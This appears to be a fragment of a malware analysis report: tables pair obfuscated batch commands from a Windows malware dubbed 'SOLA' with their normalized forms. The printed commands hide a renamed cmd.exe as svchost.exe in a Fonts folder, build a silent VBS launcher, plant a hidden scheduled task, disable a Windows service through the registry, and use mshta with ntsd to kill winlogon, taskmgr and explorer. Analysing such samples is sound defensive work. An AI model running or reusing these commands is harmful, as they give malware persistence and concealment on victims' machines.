sections.body: [{"Command": "if /I \"%%j\"==\"explorer.exe\" set Date=%%i", "Normalized": "if /I \"%%j\"==\"explorer.exe\" set Date=%%i"}, {"Command": "if not exist \"%runroot%\\SOLA.VBS\" copy \"%sola%\\SOLA.VBS\" \"%runroot%\\SOLA.VBS\"", "Normalized [trun.]": "if not exist \"C:\\ProgramData\\\u02bc\u02f5\\\\\\SOLA.VBS\" copy \"C:\\WINDOWS\\Fonts\\HIDESE~1\\SOLA.VBS\" \"C:\\ProgramDat"}, {"Command": "if not exist %Taskroot%\\Tasks.job copy %setup%\\Tasks.xxx %Taskroot%\\Tasks.job", "Normalized [trun.]": "if not exist C:\\WINDOWS\\Tasks\\Tasks.job copy C:\\WINDOWS\\Fonts\\HIDESE~1\\solasetup\\Tasks.xxx C:\\WINDOW"}]
sections.title_text: Additional command grouping after command normalization

sections.body: [{"Command": "%SystemDrive%", "Normalized": "C:"}, {"Command": "%A0001% %systemroot%\\system32\\cmd.exe %sola%\\%svchost%", "Normalized": "copy C:\\WINDOWS\\system32\\cmd.exe C:\\WINDOWS\\Fonts\\HIDESE~1\\%%i"}, {"Command": "%A0002% %systemroot%\\Tasks\\Tasks.job -s -h -r", "Normalized": "attrib C:\\WINDOWS\\Tasks\\Tasks.job -s -h -r"}, {"Command": "%homedrive%", "Normalized": "C:"}, {"Command": "%A0003% On Error Resume Next>SOLA.VBS", "Normalized": "echo On Error Resume Next>SOLA.VBS"}, {"Command": "%A0003% set ws=wscript.createobject(\"wscript.shell\")>>SOLA.VBS", "Normalized": "echo set ws=wscript.createobject(\"wscript.shell\")>>SOLA.VBS"}, {"Command": "%A0003% ws.run \"%sola%\\svchost.exe /c %sola%\\SOLA.BAT -Run\",0 >>SOLA.VBS", "Normalized [trun.]": "echo ws.run \"C:\\WINDOWS\\Fonts\\HIDESE~1\\svchost.exe /c C:\\WINDOWS\\Fonts\\HIDESE~1\\SOLA.BAT -Run\" 0 >>S"}, {"Command": "%A0001% SOLA.VBS %sola%\\SOLA.VBS", "Normalized": "copy SOLA.VBS C:\\WINDOWS\\Fonts\\HIDESE~1\\SOLA.VBS"}, {"Command": "%A0003% NT>%systemroot%\\Fonts\\HIDESE~1\\NoTasks", "Normalized": "echo NT>C:\\WINDOWS\\Fonts\\HIDESE~1\\NoTasks"}, {"Command": "%A0002% %systemroot%\\Tasks\\Tasks.job +s +h +r", "Normalized": "attrib C:\\WINDOWS\\Tasks\\Tasks.job +s +h +r"}, {"Command": "%A0001% %setup%\\sleep.exe %systemroot%\\system32\\sleep.exe", "Normalized": "copy C:\\WINDOWS\\Fonts\\HIDESE~1\\solasetup\\sleep.exe C:\\WINDOWS\\system32\\sleep.exe"}, {"Command": "%A0003% Windows Registry Editor Version 5.00>%systemroot%\\Fonts\\HIDESE~1\\Regedit.reg", "Normalized": "echo Windows Registry Editor Version 5.00>C:\\WINDOWS\\Fonts\\HIDESE~1\\Regedit.reg"}, {"Command [trun.]": "%A0003% [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ShellHWDetection]>>%systemroot%\\Fonts\\", "Normalized [trun.]": "echo [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ShellHWDetection]>>C:\\WINDOWS\\Fonts\\HIDES"}, {"Command": "%A0003% \"Start\"=dword:00000004>>%systemroot%\\Fonts\\HIDESE~1\\Regedit.reg", "Normalized": "echo \"Start\"=dword:00000004>>C:\\WINDOWS\\Fonts\\HIDESE~1\\Regedit.reg"}]

[["TABLE", [{"Command": "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -pn winlogon.exe',0);window.close()\""}, {"Command [trun.]": "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn taskmgr.exe',0);window.close"}, {"Command [trun.]": "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn explorer.exe',0);window.clos"}, {"Command [trun.]": "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('C:\\\\~Install\\\\Install.bat %%1',0);window.c"}]]]
